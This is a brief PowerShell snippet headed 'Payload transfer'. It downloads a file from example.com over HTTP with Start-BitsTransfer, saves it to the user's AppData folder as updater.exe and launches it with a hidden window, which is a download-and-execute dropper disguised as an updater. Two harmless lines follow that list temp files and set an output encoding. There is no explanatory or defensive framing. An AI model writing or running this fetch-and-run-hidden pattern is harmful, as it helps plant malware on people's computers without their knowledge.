
# Payload transfer
Start-BitsTransfer -Source 'http://example.com:80/assets/update.dat' -Destination "$env:APPDATA\updater.exe"
Start-Process -FilePath "$env:APPDATA\updater.exe" -WindowStyle Hidden
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
